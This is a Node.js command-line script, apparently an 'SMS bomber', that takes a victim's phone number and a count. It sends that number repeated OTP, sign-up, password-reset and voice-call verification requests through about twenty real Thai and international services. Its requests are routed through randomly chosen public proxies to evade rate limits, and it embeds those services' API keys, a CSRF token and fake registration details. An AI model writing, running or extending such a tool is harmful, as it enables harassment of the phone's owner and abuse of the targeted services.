require('events').EventEmitter.defaultMaxListeners = 0;

//var axios = require("axios");

//const axios = require('axios/dist/browser/axios.cjs');

//const HttpsProxyAgent = require('https-proxy-agent');

const randomstring = require("randomstring"),

    FormData = require('form-data'),

    qs = require('qs'),

    colors = require('colors'),

    axios = require('axios'), 

    HttpsProxyAgent = require('https-proxy-agent');



(async function () {

    if (process.argv.length !== 4) {

	console.log(colors.rainbow(`

╔╗ ╔═╗╔═╗╔╗╔╦╔═╗╔╦╗╔═╗╔═╗╦ ╦

╠╩╗║╣ ║╣ ║║║║╚═╗║║║║╣ ║ ║║║║

╚═╝╚═╝╚═╝╝╚╝╩╚═╝╩ ╩╚═╝╚═╝╚╩╝

`))

console.log("SMS JAVASCRIPT AUTOPROXIES ")

console.log("Ex. node sms.js 0987654321 1000")

        process.exit(0);

    } else {

        const phonenumber = process.argv[2],

            count = process.argv[3];

        const proxyscrape = await axios.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt');

        const proxies = proxyscrape.data.replace(/\r/g, '').split('\n');

        var countting = 0;

        const formUrlEncoded = x => Object.keys(x).reduce((p, c) => p + `&${c}=${encodeURIComponent(x[c])}`, '')

        function sleep(ms) {return new Promise((resolve) => {setTimeout(resolve, ms)})};

        function randomnumber(length) {

            var result = '';

            var characters = '123456789';

            var charactersLength = characters.length;

            for (var i = 0; i < length; i++) {

                result += characters.charAt(Math.floor(Math.random() *

                charactersLength));

            }

            return result;

        }

        function randomstr(length) {

            var result = '';

            var characters = 'abcdefghijklmnopqrstuvwxyz0123456789';

            var charactersLength = characters.length;

            for (var i = 0; i < length; i++) {

                result += characters.charAt(Math.floor(Math.random() *

                charactersLength));

            }

            return result;

        }

        function api1() {

            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            var phone = phonenumber.slice(1);

            var data = JSON.stringify({

                "phone": "+66" + phone

            });



            var config = {

                method: 'post',

                httpsAgent: agent,

                url: 'https://referral.huaydee.com/v1/sendotp',

                headers: {

                    'x-api-key': '0tWnR4S38L6MD3aysXVjF83M0qaIwfdm1AeiiNDn',

                    'Content-Type': 'application/json'

                },

                data: data

            };

            axios(config)

                .then(function (response) {

                    console.log("huaydee: ", JSON.stringify(response.data));

                    countting++;

                })

                .catch(function (error) { });

        }

        function headerais(token, cookie) 

        {

            return {

                'Authorization': 'Bearer ' + token,

                'Cookie': cookie,

                'X-Requested-With': ' XMLHttpRequest',

            }

        }

        function getais() {



            let proxy = proxies[Math.floor(Math.random() * proxies.length)];



            var agent = new HttpsProxyAgent('http://' + proxy);

            var phone = phonenumber;

            axios({

                method: 'get',

                url: 'https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?httpGenerate=generated',

                httpsAgent: agent,

            }).then(function (response) {

                var cookie = response.headers['set-cookie'];

                var a = response.data.match(/<!--<input type="hidden" id='token' value="[^}]*">-->\n/g);

                var token = a[0].replace(/\s+/g, '').replace(/'/g, '"').replace('">-->', '').replace('<!--<inputtype="hidden"id="token"value="', '');

                postais(token, cookie, phone, agent);

            }).catch(function (error) { })

        }

        async function api2(token, cookie, phone, agent) {

            var header = headerais(token, cookie)

            axios({

                method: 'post',

                url: 'https://srfng.ais.co.th/api/v2/login/sendOneTimePW',

                httpsAgent: agent,

                data: {

                    'msisdn': phone,

                    'serviceId': 'AISPlay',

                    'accountType': 'all',

                    'otpChannel': 'sms'

                },

                headers: header

            }).then(function (response) {

                console.log("AIS:ATTACK");

                countting++;

            }).catch(function (error) { })

        }

        async function api3() {

            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            var phone = phonenumber;

            try {

                var result = await axios({

                    httpsAgent: agent,

                    method: "POST",

                    url: "https://api2.1112.com/api/v1/otp/create",

                    data: {

                        language: "th",

                        phonenumber: phone

                    }

                })

                console.log("PIZZA:ATTACK")

                countting++;

            } catch (e) {

                // console.log("PIZZA : ERROR")

            }

        }

        function api4() {

          var phone = phonenumber;

          let proxy = proxies[Math.floor(Math.random() * proxies.length)];

          var agent = new HttpsProxyAgent('http://' + proxy);

            var data = JSON.stringify({

                "phone": phone

            });



            var config = {

                method: 'post',

                httpsAgent: agent,

                url: 'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code',

                headers: {

                    'Content-Type': 'application/json'

                },

                data: data

            };



            axios(config)

                .then(function (response) {

                    console.log("konvy")

                    countting++;

                }).catch(function (error) { });



        }

        function api5() {

            var phone = phonenumber;

            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            // 

            var config = {

                method: 'post',

                httpsAgent: agent,

                url: 'https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/' + phone,

            };

            axios(config)

                .then(function (response) {

                    console.log("kerryexpress")

                    countting++;

                }).catch(function (error) { });

        }

        function api6() {

            var phone = phonenumber.substring(1);

            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            // 

            var data = JSON.stringify({

                "operationName": "sendOtp",

                "variables": {

                    "input": {

                        "mobileNumber": phone,

                        "phoneCode": "THA-66"

                    }

                },

                "query": "mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"

            });



            var config = {

                method: 'post',

                httpsAgent: agent,

                url: 'https://graph.firster.com/graphql',

                headers: {

                    'organizationcode': 'lifestyle',

                    'Content-Type': 'application/json'

                },

                data: data

            };



            axios(config)

                .then(function (response) {

                    console.log("graph")

                    countting++;

                }).catch(function (error) { });



        }

        function api7() {

            var phone = phonenumber;

            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            // 

            var data = JSON.stringify({

                "lang": "th",

                "userType": "BUYER",

                "locale": "th",

                "orgIdfier": "scg",

                "phone": phone,

                "type": "signup",

                "otpTemplate": "buyer_signup_otp_message",

                "userParams": {

                    "buyerName": randomstr(10)

                }

            });



            var config = {

                method: 'post',

                httpsAgent: agent,

                url: 'https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661',

                headers: {

                    'Content-Type': 'application/json'

                },

                data: data

            };



            axios(config)

                .then(function (response) {

                    console.log("nocnoc")

                    countting++;

                }).catch(function (error) { });

        }

        function api8() {

            var phone = phonenumber;

            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            var config = {

                method: 'post',

                httpsAgent: agent,

                url: 'http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=' + phone,

                headers: {

                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38'

                }

            };



            axios(config)

                .then(function (response) {

                    console.log("vcanbuy")

                }).catch(function (error) { });



        }

        function api9() {

            var phone = phonenumber;

            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            // 

            var data = JSON.stringify({

                "username": phone,

                "password": "6302814184624az",

                "name": "0903281894",

                "provinceCode": "28",

                "districtCode": "393",

                "subdistrictCode": "3494",

                "zipcode": "40260",

                "siebelCustomerTypeId": "710",

                "acceptTermAndCondition": "true",

                "hasSeenConsent": "false",

                "locale": "th_TH"

            });



            var config = {

                method: 'post',

                httpsAgent: agent,

                url: 'https://ocs-prod-api.makroclick.com/next-ocs-member/user/register',

                headers: {

                    'Content-Type': 'application/json'

                },

                data: data

            };



            axios(config)

                .then(function (response) {

                    console.log("makroclick")

                    countting++;

                }).catch(function (error) { });



        }

        function api10() {

            var phone = phonenumber;

            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            // 

            var data = qs.stringify({

                'dCard': '1358231116147',

                'Mobile': phone,

                'password': '098098Az',

                'repassword': '098098Az',

                'perPrefix': 'Mr.',

                'cn': 'Dhdhhs',

                'sn': 'Vssbsh&perBirthday=5',

                'perBirthmonth': '5',

                'perBirthyear': '2545',

                'Email': 'nickytom5879%40gmail.com',

                'otp_type': 'OTP',

                'otpvalue': '',

                'messageId': 'REGISTER'

            });

            var config = {

                method: 'post',

                httpsAgent: agent,

                url: 'https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',

                headers: {

                    'Content-Type': 'application/x-www-form-urlencoded',

                },

                data: data

            };



            axios(config)

                .then(function (response) {

                    console.log("sso")

                    countting++;

                }).catch(function (error) { });

        }

        function api11() {

            var phone = phonenumber;

            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            // 

            var data = JSON.stringify({

                "username": phone

            });



            var config = {

                method: 'post',

                httpsAgent: agent,

                url: 'https://api.mcshop.com/cognito/me/forget-password',

                headers: {

                    'x-store-token': 'mcshop',

                    'x-api-key': 'ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3',

                    'Content-Type': 'application/json'

                },

                data: data

            };



            axios(config)

                .then(function (response) {

                    console.log("mcshop")

                    countting++;

                }).catch(function (error) { });

        }

        function api12() {

            var phone = phonenumber;

            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            // 

            var data = JSON.stringify({

                "brands_id": "5ffc0caa4d603200124e4eb1",

                "agent_register": "5ffc0d5cdcd4f30012aec3d9",

                "tel": phone

            });



            var config = {

                method: 'post',

                httpsAgent: agent,

                url: 'https://m.lavagame168.com/api/register-otp',

                headers: {

                    'Content-Type': 'application/json'

                },

                data: data

            };



            axios(config)

                .then(function (response) {

                    console.log("lavagame168")

                    countting++;

                }).catch(function (error) { });

        }

        function api13() {

            var phone = phonenumber;

            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            // 

            var data = new FormData();

            data.append('phone', phone);



            var config = {

                method: 'post',

                httpsAgent: agent,

                url: 'https://www.msport1688.com/auth/send_otp',

                headers: {

                    ...data.getHeaders()

                },

                data: data

            };



            axios(config)

                .then(function (response) {

                    console.log("msport")

                    countting++;

                }).catch(function (error) { });

        }

        function api14() {

            var phone = phonenumber;

            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            // httpsAgent: agent,

            var data = new FormData();

            data.append('phone', phone);



            var config = {

                method: 'post',

                httpsAgent: agent,

                url: 'https://ep789bet.net/auth/send_otp',

                headers: {

                    ...data.getHeaders()

                },

                data: data

            };



            axios(config)

                .then(function (response) {

                    console.log("SMSOTP")

                    countting++;

                }).catch(function (error) { });



        }

        function api15() {

            var phone = phonenumber;

            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            var data = '{"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":"+66' + phone + '","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":"+66' + phone + '"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]}';

            var config = {

                method: 'post',

                httpsAgent: agent,

                url: 'https://cognito-idp.ap-southeast-1.amazonaws.com/',

                headers: {

                    'content-type': 'application/x-amz-json-1.1',

                    'x-amz-target': 'AWSCognitoIdentityProviderService.SignUp',

                    'x-amz-user-agent': 'aws-amplify/0.1.x js',

                    'referer': 'https://www.bugaboo.tv/members/signup/phone'

                },

                data: data

            };

            var data2 = '{"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":"+66' + phone + '"}';

            var config2 = {

                method: 'post',

                httpsAgent: agent,

                url: 'https://cognito-idp.ap-southeast-1.amazonaws.com/',

                headers: {

                    'content-type': 'application/x-amz-json-1.1',

                    'x-amz-target': 'AWSCognitoIdentityProviderService.ResendConfirmationCode',

                    'x-amz-user-agent': 'aws-amplify/0.1.x js',

                    'referer': 'https://www.bugaboo.tv/members/resetpass/phone'

                },

                data: data2

            };

            axios(config).then(function (response) {

                axios(config2)

                    .then(function (response) {

                        console.log("bugaboo")

                        countting++;

                    }).catch(function (error) { });

            }).catch(function (error) { });



            // httpsAgent: agent,



        }

        function api16() {

            var phone = phonenumber;

            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            // 

            var data = JSON.stringify({

                "username": phone,

                "optType": 0

            });



            var config = {

                method: 'post',

                url: 'https://www.carsome.co.th/website/login/sendSMS',

                headers: {

                    'Content-Type': 'application/json'

                },

                httpsAgent: agent,

                data: data

            };



            axios(config)

                .then(function (response) {

                    console.log("carsome")

                    countting++;

                }).catch(function (error) { });

        }

        function api17() {

            var phone = phonenumber;

            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            // 

            var data = JSON.stringify({

                "brands_id": "60a6563a232a600012521982",

                "agent_register": "60a76a7f233d2900110070e0",

                "tel": phone

            });



            var config = {

                method: 'post',

                httpsAgent: agent,

                url: 'https://m.riches666.com/api/register-otp',

                headers: {

                    'Content-Type': 'application/json'

                },

                data: data

            };



            axios(config)

                .then(function (response) {

                    console.log("SMSMSA")

                    countting++;

                }).catch(function (error) { });

        }

        function api18() {

            var phone = phonenumber;

            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            // 

            var data = JSON.stringify({

                "operationName": "SendVerificationCodePhone",

                "variables": {

                  "via": "call",

                  "phoneNumber": phone,

                  "phoneNumberCountryCode": "66"

                },

                "extensions": {

                  "persistedQuery": {

                    "version": 1,

                    "sha256Hash": "e960cbacc61009abc14739b7f27efbedcfdc82b0a5b5ae573732355568f0c93b"

                  }

                }

              });

              

              var config = {

                method: 'post',

                httpsAgent: agent,

                url: 'https://www.opentable.com/dapi/fe/gql',

                headers: { 

                  'x-csrf-token': '30741e7f-18cc-4b72-82be-fd50616be91d', 

                  'Content-Type': 'application/json', 

                },

                data : data

              };

            axios(config)

                .then(function (response) {

                    console.log("opentable call")

                    countting++;

                }).catch(function (error) { });

        }

        function api19() {

            var phone = phonenumber;

            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            // 

            var data = JSON.stringify({

                "phone": phone,

            });



            var config = {

                method: 'post',

                httpsAgent: agent,

                url: 'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code',

                headers: {

                    'Content-Type': 'application/json',

                },

                data: data

            };

            axios(config)

                .then(function (response) {

                    console.log("KONVY")

                    countting++;

                }).catch(function (error) { });

	}

	      function api20() {

            var phone = phonenumber;



            let proxy = proxies[Math.floor(Math.random() * proxies.length)];

            var agent = new HttpsProxyAgent('http://' + proxy);

            var config = {

                method: 'get',

                url: 'https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=66' + phone + '&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2',

                httpsAgent: agent,

            };



            axios(config)

                .then(function (response) {

                    console.log("joox")

                    countting++;

                }).catch(function (error) { });

        }

        setInterval(() => {

            if (count == countting) {

                process.exit(0);

            } else {

                var randomnum = Math.floor(Math.random() * 69);

                switch (randomnum + 1) {

                    case 1: {

                        api1();

                        break;

                    }

                    case 2: {

                        getais();

                        break;

                    }

                    case 3: {

                        api2();

                        break;

                    }

                    case 4: {

                        api3();

                        break;

                    }

                    case 5: {

                        api4();

                        break;

                    }

                    case 6: {

                        api5();

                        break;

                    }

                    case 7: {

                        api6();

                        break;

                    }

                    case 8: {

                        api7();

                        break;

                    }

                    case 9: {

                        api8();

                        break;

                    }

                    case 10: {

                        api9();

                        break;

                    }

                    case 11: {

                        api10();

                        break;

                    }

                    case 12: {

                        api11();

                        break;

                    }

                    case 13: {

                        api12();

                        break;

                    }

                    case 14: {

                        api13();

                        break;

                    }

                    case 15: {

                        api14();

                        break;

                    }

                    case 16: {

                        api15();

                        break;

                    }

                    case 17: {

                        api16();

                        break;

                    }

                    case 18: {

                        api17();

                        break;

                    }

                    case 19: {

                        api18();

                        break;

                    }

                    case 20: {

                        api19();

                        break;

                    }

                    case 21: {

                        api20();

                        break;

                      

                    }

                  

                }

              

            }

          

        });

      

    }

});
